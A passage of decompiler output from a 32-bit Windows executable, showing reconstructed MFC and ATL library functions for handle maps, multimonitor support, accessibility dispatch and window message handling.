  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  public: void __thiscall CHandleMap::DeleteTemp(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CHandleMap::DeleteTemp(CHandleMap *this)

{
  int iVar1;
  void *local_10;
  __POSITION *local_c;
  void *local_8;
  
  if (this != (CHandleMap *)0x0) {
    local_c = (__POSITION *)-(uint)(*(int *)(this + 0x44) != 0);
    if (local_c != (__POSITION *)0x0) {
      do {
        CMapPtrToPtr::GetNextAssoc((CMapPtrToPtr *)(this + 0x38),&local_c,&local_10,&local_8);
        iVar1 = *(int *)(this + 0x58);
        *(undefined4 *)(iVar1 + (int)local_8) = 0;
        if (*(int *)(this + 0x5c) == 2) {
          ((undefined4 *)(iVar1 + (int)local_8))[1] = 0;
        }
        (**(code **)(this + 0x18))(local_8);
      } while (local_c != (__POSITION *)0x0);
    }
    CMapPtrToPtr::RemoveAll((CMapPtrToPtr *)(this + 0x38));
    CFixedAllocNoSync::FreeAll((CFixedAllocNoSync *)(this + 4));
  }
  return;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual __thiscall CHandleMap::~CHandleMap(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CHandleMap::~CHandleMap(CHandleMap *this)

{
  *(undefined ***)this = vftable;
  DeleteTemp(this);
  FUN_0040c350((undefined4 *)(this + 0x38));
  FUN_0040c350((undefined4 *)(this + 0x1c));
  FUN_00413030((int)(this + 4));
  return;
}



CHandleMap * __thiscall FUN_0040da5f(void *this,byte param_1)

{
  CHandleMap::~CHandleMap((CHandleMap *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (CHandleMap *)this;
}



// Library Function - Single Match
//  _IsPlatformNT
// 
// Library: Visual Studio 2008 Release

void _IsPlatformNT(void)

{
  undefined local_9c [148];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  _memset(local_9c + 4,0,0x90);
  local_9c._0_4_ = 0x94;
  GetVersionExA((LPOSVERSIONINFOA)local_9c);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _InitMultipleMonitorStubs
// 
// Library: Visual Studio 2008 Release

bool _InitMultipleMonitorStubs(void)

{
  HMODULE hModule;
  char *lpProcName;
  
  if (DAT_00435b8c != 0) {
    return DAT_00435b80 != (FARPROC)0x0;
  }
  DAT_00435b90 = _IsPlatformNT();
  hModule = GetModuleHandleW(L"USER32");
  if ((((hModule != (HMODULE)0x0) &&
       (_DAT_00435b70 = GetProcAddress(hModule,"GetSystemMetrics"), _DAT_00435b70 != (FARPROC)0x0))
      && (DAT_00435b74 = GetProcAddress(hModule,"MonitorFromWindow"), DAT_00435b74 != (FARPROC)0x0))
     && (((_DAT_00435b78 = GetProcAddress(hModule,"MonitorFromRect"), _DAT_00435b78 != (FARPROC)0x0
          && (_DAT_00435b7c = GetProcAddress(hModule,"MonitorFromPoint"),
             _DAT_00435b7c != (FARPROC)0x0)) &&
         ((_DAT_00435b84 = GetProcAddress(hModule,"EnumDisplayMonitors"),
          _DAT_00435b84 != (FARPROC)0x0 &&
          (_DAT_00435b88 = GetProcAddress(hModule,"EnumDisplayDevicesW"),
          _DAT_00435b88 != (FARPROC)0x0)))))) {
    if (DAT_00435b90 == 0) {
      lpProcName = "GetMonitorInfoA";
    }
    else {
      lpProcName = "GetMonitorInfoW";
    }
    DAT_00435b80 = GetProcAddress(hModule,lpProcName);
    if (DAT_00435b80 != (FARPROC)0x0) {
      DAT_00435b8c = 1;
      return true;
    }
  }
  _DAT_00435b88 = (FARPROC)0x0;
  _DAT_00435b84 = (FARPROC)0x0;
  DAT_00435b80 = (FARPROC)0x0;
  _DAT_00435b7c = (FARPROC)0x0;
  _DAT_00435b78 = (FARPROC)0x0;
  DAT_00435b74 = (FARPROC)0x0;
  _DAT_00435b70 = (FARPROC)0x0;
  DAT_00435b8c = 1;
  return false;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _xMonitorFromRect@8
// 
// Library: Visual Studio 2008 Release

undefined4 _xMonitorFromRect_8(int *param_1,byte param_2)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined4 uVar2;
  int iVar3;
  
  bVar1 = _InitMultipleMonitorStubs();
  if (CONCAT31(extraout_var,bVar1) != 0) {
                    // WARNING: Could not recover jumptable at 0x0040dbf3. Too many branches
                    // WARNING: Treating indirect jump as call
    uVar2 = (*_DAT_00435b78)();
    return uVar2;
  }
  if ((param_2 & 3) == 0) {
    if ((0 < param_1[2]) && (0 < param_1[3])) {
      iVar3 = GetSystemMetrics(0);
      if (*param_1 < iVar3) {
        iVar3 = GetSystemMetrics(1);
        if (param_1[1] < iVar3) goto LAB_0040dc2a;
      }
    }
    uVar2 = 0;
  }
  else {
LAB_0040dc2a:
    uVar2 = 0x12340042;
  }
  return uVar2;
}



// Library Function - Single Match
//  _xMonitorFromWindow@8
// 
// Library: Visual Studio 2008 Release

undefined4 _xMonitorFromWindow_8(HWND param_1,uint param_2)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined4 uVar2;
  BOOL BVar3;
  int iVar4;
  WINDOWPLACEMENT local_30;
  
  bVar1 = _InitMultipleMonitorStubs();
  if (CONCAT31(extraout_var,bVar1) == 0) {
    if ((param_2 & 3) == 0) {
      BVar3 = IsIconic(param_1);
      if (BVar3 == 0) {
        iVar4 = GetWindowRect(param_1,&local_30.rcNormalPosition);
      }
      else {
        iVar4 = GetWindowPlacement(param_1,&local_30);
      }
      if (iVar4 == 0) {
        uVar2 = 0;
      }
      else {
        uVar2 = _xMonitorFromRect_8(&local_30.rcNormalPosition.left,(byte)param_2);
      }
    }
    else {
      uVar2 = 0x12340042;
    }
  }
  else {
    uVar2 = (*DAT_00435b74)(param_1,param_2);
  }
  return uVar2;
}



// Library Function - Single Match
//  _xGetMonitorInfo@8
// 
// Library: Visual Studio 2008 Release

int _xGetMonitorInfo_8(int param_1,uint *param_2)

{
  bool bVar1;
  undefined3 extraout_var;
  int iVar2;
  BOOL BVar3;
  uint uVar4;
  uint local_14;
  uint uStack_10;
  uint uStack_c;
  uint uStack_8;
  
  bVar1 = _InitMultipleMonitorStubs();
  if (CONCAT31(extraout_var,bVar1) == 0) {
    if (((param_1 == 0x12340042) && (param_2 != (uint *)0x0)) &&
       ((0x27 < *param_2 && (BVar3 = SystemParametersInfoA(0x30,0,&local_14,0), BVar3 != 0)))) {
      param_2[1] = 0;
      param_2[2] = 0;
      uVar4 = GetSystemMetrics(0);
      param_2[3] = uVar4;
      uVar4 = GetSystemMetrics(1);
      param_2[5] = local_14;
      param_2[6] = uStack_10;
      param_2[7] = uStack_c;
      param_2[8] = uStack_8;
      iVar2 = 1;
      param_2[4] = uVar4;
      param_2[9] = 1;
      if (0x67 < *param_2) {
        MultiByteToWideChar(0,0,"DISPLAY",-1,(LPWSTR)(param_2 + 10),0x20);
      }
    }
    else {
      iVar2 = 0;
    }
  }
  else {
    iVar2 = (*DAT_00435b80)(param_1,param_2);
    if (((iVar2 != 0) && (DAT_00435b90 == 0)) && (0x67 < *param_2)) {
      MultiByteToWideChar(0,0,(LPCSTR)(param_2 + 10),-1,(LPWSTR)(param_2 + 10),0x20);
    }
  }
  return iVar2;
}



// Library Function - Single Match
//  long __stdcall ATL::AtlIAccessibleInvokeHelper(struct IAccessible *,long,struct _GUID const
// &,unsigned long,unsigned short,struct tagDISPPARAMS *,struct tagVARIANT *,struct tagEXCEPINFO
// *,unsigned int *)
// 
// Library: Visual Studio 2008 Release

long ATL::AtlIAccessibleInvokeHelper
               (IAccessible *param_1,long param_2,_GUID *param_3,ulong param_4,ushort param_5,
               tagDISPPARAMS *param_6,tagVARIANT *param_7,tagEXCEPINFO *param_8,uint *param_9)

{
  ushort uVar1;
  IAccessible *pIVar2;
  IAccessible *pIVar3;
  IAccessible *pIVar4;
  tagDISPPARAMS *ptVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  undefined2 in_stack_00000016;
  undefined2 uVar9;
  int *local_48 [4];
  undefined4 *local_38;
  int local_34;
  int iStack_30;
  int iStack_2c;
  int iStack_28;
  undefined2 local_24 [8];
  int local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  ptVar5 = param_6;
  pIVar4 = param_1;
  iVar8 = 0;
  local_24[0] = 0;
  if (param_1 == (IAccessible *)0x0) {
    return -0x7ff8ffa9;
  }
  if (param_6 == (tagDISPPARAMS *)0x0) {
    return -0x7ffdfff8;
  }
  pIVar2 = *(IAccessible **)(param_6 + 8);
  if ((IAccessible *)0x5 < pIVar2) {
    return -0x7ffdfff2;
  }
  param_1 = (IAccessible *)0x0;
  if (*(int *)(param_6 + 0xc) != 0) {
    param_6 = *(tagDISPPARAMS **)(param_6 + 4);
    do {
      pIVar3 = *(IAccessible **)param_6;
      if (pIVar2 <= pIVar3) {
        return -0x7ffdfff2;
      }
      param_6 = param_6 + 4;
      param_1 = param_1 + 1;
      local_48[(int)pIVar3] = (int *)(*(int *)ptVar5 + iVar8);
      iVar8 = iVar8 + 0x10;
    } while (param_1 < *(IAccessible **)(ptVar5 + 0xc));
  }
  if (param_1 < pIVar2) {
    iVar8 = (int)param_1 * 0x10 + *(int *)ptVar5;
    iVar7 = (int)pIVar2 - (int)param_1;
    piVar6 = (int *)(&stack0xffffffb4 + ((int)pIVar2 - (int)param_1) * 4);
    do {
      *piVar6 = iVar8;
      iVar8 = iVar8 + 0x10;
      piVar6 = piVar6 + -1;
      iVar7 = iVar7 + -1;
    } while (iVar7 != 0);
  }
  iVar8 = -0x7ffdfffd;
  if (param_9 == (uint *)0x0) {
    param_9 = (uint *)&param_5;
  }
  if (param_7 == (tagVARIANT *)0x0) {
    param_7 = (tagVARIANT *)local_24;
  }
  Ordinal_8(&local_14);
  switch(param_2) {
  default:
    goto switchD_0040de42_caseD_13;
  case -0x139a:
    if (*(int *)(ptVar5 + 8) == 1) {
      iVar8 = (**(code **)(*(int *)pIVar4 + 100))
                        (pIVar4,*local_48[0],local_48[0][1],local_48[0][2],local_48[0][3]);
      goto switchD_0040de42_caseD_13;
    }
    break;
  case -0x1399:
    if (*(int *)(ptVar5 + 8) == 2) {
      if (*(short *)local_48[0] != 3) {
        iVar8 = Ordinal_12(&local_14,local_48[0],0,3);
        if (iVar8 < 0) goto LAB_0040e06e;
        local_48[0] = &local_14;
      }
      _param_5 = local_48[0][2];
      if (*(short *)local_48[1] != 3) {
        iVar8 = Ordinal_12(&local_14,local_48[1],0,3);
        if (iVar8 < 0) {
LAB_0040e255:
          *param_9 = 1;
          goto switchD_0040de42_caseD_13;
        }
        local_48[1] = &local_14;
      }
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x60))(pIVar4,_param_5,local_48[1][2],param_7);
      goto switchD_0040de42_caseD_13;
    }
    break;
  case -0x1398:
    if (*(int *)(ptVar5 + 8) == 2) {
      if (*(short *)local_48[0] != 3) {
        iVar8 = Ordinal_12(&local_14,local_48[0],0,3);
        if (iVar8 < 0) goto LAB_0040e06e;
        local_48[0] = &local_14;
      }
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x5c))
                        (pIVar4,local_48[0][2],*local_48[1],local_48[1][1],local_48[1][2],
                         local_48[1][3],param_7);
      goto switchD_0040de42_caseD_13;
    }
    break;
  case -0x1397:
    if (*(int *)(ptVar5 + 8) == 5) {
      while ((uVar1 = *(ushort *)local_48[0], (uVar1 & 0x4000) != 0 && ((uVar1 & 0xf) != 0))) {
        if ((uVar1 & 0xc) == 0) {
          local_14 = local_48[0][2];
        }
        else {
          Ordinal_9(local_48[0][2]);
          *(undefined2 *)local_48[0][2] = 3;
          local_14 = local_48[0][2] + 8;
        }
      }
      *param_9 = 0;
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x58))
                        (pIVar4,local_14,local_10,local_c,local_8,*local_38,local_38[1],local_38[2],
                         local_38[3]);
      goto switchD_0040de42_caseD_13;
    }
    break;
  case -0x1396:
    if (*(int *)(ptVar5 + 8) == 2) {
      if (*(short *)local_48[0] != 3) {
        iVar8 = Ordinal_12(&local_14,local_48[0],0,3);
        if (iVar8 < 0) goto LAB_0040e06e;
        local_48[0] = &local_14;
      }
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x54))
                        (pIVar4,local_48[0][2],*local_48[1],local_48[1][1],local_48[1][2],
                         local_48[1][3]);
      goto switchD_0040de42_caseD_13;
    }
    break;
  case -0x1395:
    if (*(int *)(ptVar5 + 8) == 1) {
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x50))
                        (pIVar4,*local_48[0],local_48[0][1],local_48[0][2],local_48[0][3],
                         param_7 + 8);
LAB_0040dffc:
      if (iVar8 < 0) goto switchD_0040de42_caseD_13;
      uVar9 = 8;
      goto LAB_0040e2cc;
    }
    break;
  case -0x1394:
    iVar8 = (**(code **)(*(int *)pIVar4 + 0x4c))(pIVar4,param_7);
    goto switchD_0040de42_caseD_13;
  case -0x1393:
    iVar8 = (**(code **)(*(int *)pIVar4 + 0x48))(pIVar4,param_7);
    goto switchD_0040de42_caseD_13;
  case -0x1392:
    if (*(int *)(ptVar5 + 8) == 1) {
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x44))
                        (pIVar4,*local_48[0],local_48[0][1],local_48[0][2],local_48[0][3],
                         param_7 + 8);
      goto LAB_0040dffc;
    }
    break;
  case -0x1391:
    if (*(int *)(ptVar5 + 8) == 2) {
      uVar1 = *(ushort *)local_48[0];
      if (((uVar1 & 0x4000) != 0) && ((uVar1 & 0xc) == 0)) {
        iVar8 = -0x7ffdfffb;
LAB_0040e06e:
        *param_9 = 0;
        goto switchD_0040de42_caseD_13;
      }
      if (uVar1 == 0x400c) {
        Ordinal_9(local_48[0][2]);
        *(undefined2 *)local_48[0][2] = 8;
        piVar6 = (int *)(local_48[0][2] + 8);
      }
      else if (uVar1 == 0x4008) {
        piVar6 = (int *)local_48[0][2];
      }
      else {
        Ordinal_9(local_48[0]);
        piVar6 = local_48[0] + 2;
        *(undefined2 *)local_48[0] = 8;
      }
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x40))
                        (pIVar4,piVar6,*local_48[1],local_48[1][1],local_48[1][2],local_48[1][3],
                         param_7 + 8);
      goto LAB_0040e0d5;
    }
    break;
  case -0x1390:
    if (*(int *)(ptVar5 + 8) == 1) {
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x3c))
                        (pIVar4,*local_48[0],local_48[0][1],local_48[0][2],local_48[0][3],
                         param_7 + 8);
      goto LAB_0040dffc;
    }
    break;
  case -0x138f:
    if (*(int *)(ptVar5 + 8) == 1) {
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x38))
                        (pIVar4,*local_48[0],local_48[0][1],local_48[0][2],local_48[0][3],param_7);
      goto switchD_0040de42_caseD_13;
    }
    break;
  case -0x138e:
    if (*(int *)(ptVar5 + 8) == 1) {
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x34))
                        (pIVar4,*local_48[0],local_48[0][1],local_48[0][2],local_48[0][3],param_7);
      goto switchD_0040de42_caseD_13;
    }
    break;
  case -0x138d:
    if (*(int *)(ptVar5 + 8) == 1) {
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x30))
                        (pIVar4,*local_48[0],local_48[0][1],local_48[0][2],local_48[0][3],
                         param_7 + 8);
      goto LAB_0040dffc;
    }
    break;
  case -0x138c:
    if ((_param_5 & 2) == 0) {
      if ((_param_5 & 4) == 0) goto switchD_0040de42_caseD_ffffec75;
      if (*(int *)(ptVar5 + 8) == 2) {
        local_34 = *local_48[0];
        iStack_30 = local_48[0][1];
        iStack_2c = local_48[0][2];
        iStack_28 = local_48[0][3];
        if (*(short *)local_48[1] != 8) {
          iVar8 = Ordinal_12(&local_14,local_48[1],0,3);
          if (iVar8 < 0) goto LAB_0040e255;
          local_48[1] = &local_14;
        }
        iVar8 = (**(code **)(*(int *)pIVar4 + 0x6c))
                          (pIVar4,local_34,iStack_30,iStack_2c,iStack_28,local_48[1][2]);
        goto switchD_0040de42_caseD_13;
      }
    }
    else if (*(int *)(ptVar5 + 8) == 1) {
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x2c))
                        (pIVar4,*local_48[0],local_48[0][1],local_48[0][2],local_48[0][3],
                         param_7 + 8);
      goto LAB_0040dffc;
    }
    break;
  case -0x138b:
switchD_0040de42_caseD_ffffec75:
    if ((_param_5 & 2) == 0) {
      if ((_param_5 & 4) == 0) goto switchD_0040de42_caseD_ffffec76;
      if (*(int *)(ptVar5 + 8) == 2) {
        local_34 = *local_48[0];
        iStack_30 = local_48[0][1];
        iStack_2c = local_48[0][2];
        iStack_28 = local_48[0][3];
        if (*(short *)local_48[1] != 8) {
          iVar8 = Ordinal_12(&local_14,local_48[1],0,3);
          if (iVar8 < 0) goto LAB_0040e255;
          local_48[1] = &local_14;
        }
        iVar8 = (**(code **)(*(int *)pIVar4 + 0x68))
                          (pIVar4,local_34,iStack_30,iStack_2c,iStack_28,local_48[1][2]);
        goto switchD_0040de42_caseD_13;
      }
    }
    else if (*(int *)(ptVar5 + 8) == 1) {
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x28))
                        (pIVar4,*local_48[0],local_48[0][1],local_48[0][2],local_48[0][3],
                         param_7 + 8);
      goto LAB_0040dffc;
    }
    break;
  case -0x138a:
switchD_0040de42_caseD_ffffec76:
    if (*(int *)(ptVar5 + 8) == 1) {
      iVar8 = (**(code **)(*(int *)pIVar4 + 0x24))
                        (pIVar4,*local_48[0],local_48[0][1],local_48[0][2],local_48[0][3],
                         param_7 + 8);
      goto LAB_0040e2c4;
    }
    break;
  case -0x1389:
    iVar8 = (**(code **)(*(int *)pIVar4 + 0x20))(pIVar4,param_7 + 8);
LAB_0040e0d5:
    if (iVar8 < 0) goto switchD_0040de42_caseD_13;
    uVar9 = 3;
    goto LAB_0040e2cc;
  case -5000:
    iVar8 = (**(code **)(*(int *)pIVar4 + 0x1c))(pIVar4,param_7 + 8);
LAB_0040e2c4:
    if (iVar8 < 0) goto switchD_0040de42_caseD_13;
    uVar9 = 9;
LAB_0040e2cc:
    *(undefined2 *)param_7 = uVar9;
    goto switchD_0040de42_caseD_13;
  }
  iVar8 = -0x7ffdfff2;
switchD_0040de42_caseD_13:
  Ordinal_9(&local_14);
  return iVar8;
}



// Library Function - Single Match
//  long __stdcall ATL::AtlIAccessibleGetIDsOfNamesHelper(struct _GUID const &,wchar_t * *,unsigned
// int,unsigned long,long *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long ATL::AtlIAccessibleGetIDsOfNamesHelper
               (_GUID *param_1,wchar_t **param_2,uint param_3,ulong param_4,long *param_5)

{
  bool bVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  
  uVar3 = 0;
  if (param_3 != 0) {
    do {
      bVar1 = false;
      uVar4 = 0;
      do {
        iVar2 = lstrcmpW(param_2[uVar3],*(LPCWSTR *)((int)&PTR_u_accParent_004327c8 + uVar4));
        if (iVar2 == 0) {
          bVar1 = true;
          param_5[uVar3] = *(long *)((int)&DAT_00432778 + uVar4);
        }
        uVar4 = uVar4 + 4;
      } while (uVar4 < 0x4c);
      if (!bVar1) {
        return -0x7ffdfffa;
      }
      uVar3 = uVar3 + 1;
    } while (uVar3 < param_3);
  }
  return 0;
}



// Library Function - Single Match
//  private: __thiscall CWnd::CWnd(struct HWND__ *)
// 
// Library: Visual Studio 2008 Release

CWnd * __thiscall CWnd::CWnd(CWnd *this,HWND__ *param_1)

{
  CCmdTarget::CCmdTarget((CCmdTarget *)this);
  *(undefined ***)this = vftable;
  *(undefined ***)(this + 0x30) = XAccessible::vftable;
  *(undefined ***)(this + 0x34) = XAccessibleServer::vftable;
  *(HWND__ **)(this + 0x20) = param_1;
  this[0x24] = (CWnd)0x0;
  *(undefined4 *)(this + 0x2c) = 0;
  *(undefined4 *)(this + 0x38) = 0;
  *(undefined4 *)(this + 0x3c) = 0;
  *(undefined4 *)(this + 0x40) = 0;
  *(undefined4 *)(this + 0x44) = 0;
  *(undefined4 *)(this + 0x48) = 0;
  *(undefined4 *)(this + 0x4c) = 0;
  *(undefined4 *)(this + 0x50) = 0;
  return this;
}



void __fastcall FUN_0040e3e1(int param_1)

{
  HMENU pHVar1;
  
  pHVar1 = GetMenu(*(HWND *)(param_1 + 0x20));
  CMenu::FromHandle(pHVar1);
  return;
}



void __fastcall FUN_0040e3f1(int *param_1)

{
  if (param_1[8] != 0) {
                    // WARNING: Could not recover jumptable at 0x0040e3f9. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(*param_1 + 0x60))();
    return;
  }
                    // WARNING: Could not recover jumptable at 0x0040e3fc. Too many branches
                    // WARNING: Treating indirect jump as call
  (**(code **)(*param_1 + 0x11c))();
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  protected: virtual long __thiscall CWnd::DefWindowProcA(unsigned int,unsigned int,long)
//  protected: virtual long __thiscall CWnd::DefWindowProcW(unsigned int,unsigned int,long)
// 
// Library: Visual Studio 2008 Release

LRESULT FID_conflict_DefWindowProcA(HWND hWnd,UINT Msg,WPARAM wParam,LPARAM lParam)

{
  WNDPROC *ppWVar1;
  LRESULT LVar2;
  WNDPROC lpPrevWndFunc;
  int *in_ECX;
  
  lpPrevWndFunc = (WNDPROC)in_ECX[0x10];
  if (lpPrevWndFunc == (WNDPROC)0x0) {
    ppWVar1 = (WNDPROC *)(**(code **)(*in_ECX + 0xf8))();
    lpPrevWndFunc = *ppWVar1;
    if (lpPrevWndFunc == (WNDPROC)0x0) {
      LVar2 = DefWindowProcW((HWND)in_ECX[8],(UINT)hWnd,Msg,wParam);
      return LVar2;
    }
  }
  LVar2 = CallWindowProcW(lpPrevWndFunc,(HWND)in_ECX[8],(UINT)hWnd,Msg,wParam);
  return LVar2;
}



int __fastcall FUN_0040e44b(int param_1)

{
  return param_1 + 0x40;
}



// Library Function - Single Match
//  public: virtual int __thiscall CWnd::PreTranslateMessage(struct tagMSG *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

int __thiscall CWnd::PreTranslateMessage(CWnd *this,tagMSG *param_1)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  if (*(code **)(pAVar1 + 0x38) != (code *)0x0) {
    (**(code **)(pAVar1 + 0x38))(param_1,this);
  }
  return 0;
}



// Library Function - Multiple Matches With Same Base Name
//  public: virtual int __thiscall CWnd::OnToolHitTest(class CPoint,struct tagTOOLINFOA *)const 
//  public: virtual int __thiscall CWnd::OnToolHitTest(class CPoint,struct tagTOOLINFOW *)const 
// 
// Library: Visual Studio 2008 Release

int __thiscall OnToolHitTest(void *this,LONG param_1,LONG param_2,uint *param_3)

{
  tagPOINT tVar1;
  HWND__ *hWnd;
  int iVar2;
  uint uVar3;
  
  tVar1.y = param_2;
  tVar1.x = param_1;
  hWnd = _AfxChildWindowFromPoint(*(HWND__ **)((int)this + 0x20),tVar1);
  if (hWnd == (HWND__ *)0x0) {
    iVar2 = -1;
  }
  else {
    iVar2 = GetDlgCtrlID(hWnd);
    if ((param_3 != (uint *)0x0) && (0x2b < *param_3)) {
      uVar3 = *(uint *)((int)this + 0x20);
      param_3[1] = param_3[1] | 1;
      param_3[9] = 0xffffffff;
      param_3[2] = uVar3;
      param_3[3] = (uint)hWnd;
      uVar3 = SendMessageW(hWnd,0x87,0,0);
      if ((uVar3 & 0x2000) == 0) {
        param_3[1] = param_3[1] | 0x80000002;
      }
    }
  }
  return iVar2;
}



void __fastcall FUN_0040e4e3(undefined4 *param_1)

{
  *param_1 = _AFX_HTMLHELP_STATE::vftable;
  if ((HMODULE)param_1[1] != (HMODULE)0x0) {
    FreeLibrary((HMODULE)param_1[1]);
  }
  return;
}



undefined4 * __thiscall FUN_0040e4f8(void *this,byte param_1)

{
  FUN_0040e4e3((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    CNoTrackObject::operator_delete(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  struct AFX_MSGMAP_ENTRY const * __stdcall AfxFindMessageEntry(struct AFX_MSGMAP_ENTRY const
// *,unsigned int,unsigned int,unsigned int)
// 
// Library: Visual Studio 2008 Release

AFX_MSGMAP_ENTRY *
AfxFindMessageEntry(AFX_MSGMAP_ENTRY *param_1,uint param_2,uint param_3,uint param_4)

{
  while( true ) {
    if (*(uint *)((int)param_1 + 0x10) == 0) {
      return (AFX_MSGMAP_ENTRY *)0x0;
    }
    if ((((param_2 == *(uint *)param_1) && (param_3 == *(uint *)((int)param_1 + 4))) &&
        (*(uint *)((int)param_1 + 8) <= param_4)) && (param_4 <= *(uint *)((int)param_1 + 0xc)))
    break;
    param_1 = (AFX_MSGMAP_ENTRY *)((int)param_1 + 0x18);
  }
  return (AFX_MSGMAP_ENTRY *)(uint *)param_1;
}



// Library Function - Single Match
//  protected: virtual long __thiscall CWnd::WindowProc(unsigned int,unsigned int,long)
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release,
// Visual Studio 2010 Release

long __thiscall CWnd::WindowProc(CWnd *this,uint param_1,uint param_2,long param_3)

{
  int iVar1;
  long local_8;
  
  local_8 = 0;
  iVar1 = (**(code **)(*(int *)this + 0x114))(param_1,param_2,param_3,&local_8);
  if (iVar1 == 0) {
    local_8 = (**(code **)(*(int *)this + 0x118))(param_1,param_2,param_3);
  }
  return local_8;
}



// Library Function - Single Match
//  public: __thiscall CTestCmdUI::CTestCmdUI(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

CTestCmdUI * __thiscall CTestCmdUI::CTestCmdUI(CTestCmdUI *this)

{
  CCmdUI::CCmdUI((CCmdUI *)this);
  *(undefined ***)this = vftable;
  *(undefined4 *)(this + 0x28) = 1;
  return this;
}



void __thiscall FUN_0040e5bb(void *this,undefined4 param_1)

{
  *(undefined4 *)((int)this + 0x28) = param_1;
  *(undefined4 *)((int)this + 0x18) = 1;
  return;
}



void FUN_0040e5d1(void *param_1)

{
  FUN_0040a3fc(param_1);
  return;
}



// Library Function - Single Match
//  public: virtual void __thiscall CWnd::CalcWindowRect(struct tagRECT *,unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall CWnd::CalcWindowRect(CWnd *this,tagRECT *param_1,uint param_2)

{
  ulong dwExStyle;
  ulong dwStyle;
  BOOL bMenu;
  
  dwExStyle = GetExStyle(this);
  if (param_2 == 0) {
    dwExStyle = dwExStyle & 0xfffffdff;
  }
  bMenu = 0;
  dwStyle = GetExStyle(this);
  AdjustWindowRectEx(param_1,dwStyle,bMenu,dwExStyle);
  return;
}



undefined ** FUN_0040e614(void)

{
  return &PTR_DAT_00429ad0;
}



// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::GetIDsOfNames(struct _GUID const &,wchar_t *
// *,unsigned int,unsigned long,long *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long CWnd::XAccessible::GetIDsOfNames
               (_GUID *param_1,wchar_t **param_2,uint param_3,ulong param_4,long *param_5)

{
  long lVar1;
  long *in_stack_00000018;
  
  lVar1 = ATL::AtlIAccessibleGetIDsOfNamesHelper
                    ((_GUID *)param_2,(wchar_t **)param_3,param_4,(ulong)param_5,in_stack_00000018);
  return lVar1;
}



undefined4 FUN_0040e637(undefined4 param_1,undefined4 *param_2)

{
  undefined4 uVar1;
  
  if (param_2 == (undefined4 *)0x0) {
    uVar1 = 0x80004003;
  }
  else {
    *param_2 = 1;
    uVar1 = 0;
  }
  return uVar1;
}



undefined4 FUN_0040e656(void)

{
  return 0x80004001;
}



undefined4 FUN_0040e65e(undefined4 param_1,undefined4 *param_2)

{
  undefined4 uVar1;
  
  if (param_2 == (undefined4 *)0x0) {
    uVar1 = 0x80004003;
  }
  else {
    *param_2 = 0;
    uVar1 = 0x80004001;
  }
  return uVar1;
}



HRESULT __fastcall FUN_0040e67d(int param_1)

{
  HRESULT HVar1;
  
  if ((*(void **)(param_1 + 0x28) == (void *)0x0) &&
     (HVar1 = CreateStdAccessibleObject
                        (*(HWND *)(param_1 + 0x20),-4,(IID *)&DAT_00429f64,(void **)(param_1 + 0x28)
                        ), HVar1 < 0)) {
    return HVar1;
  }
  return 0;
}



void __thiscall FUN_0040e69c(void *this,undefined4 param_1)

{
  (**(code **)(**(int **)((int)this + 0x28) + 0x1c))(*(int **)((int)this + 0x28),param_1);
  return;
}



void __thiscall FUN_0040e6b1(void *this,undefined4 param_1)

{
  (**(code **)(**(int **)((int)this + 0x28) + 0x20))(*(int **)((int)this + 0x28),param_1);
  return;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::get_accChild(struct tagVARIANT,struct IDispatch * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

long __thiscall
CWnd::get_accChild(CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,
                  undefined4 param_4,undefined4 param_5)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x24))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5);
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::get_accName(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

long __thiscall
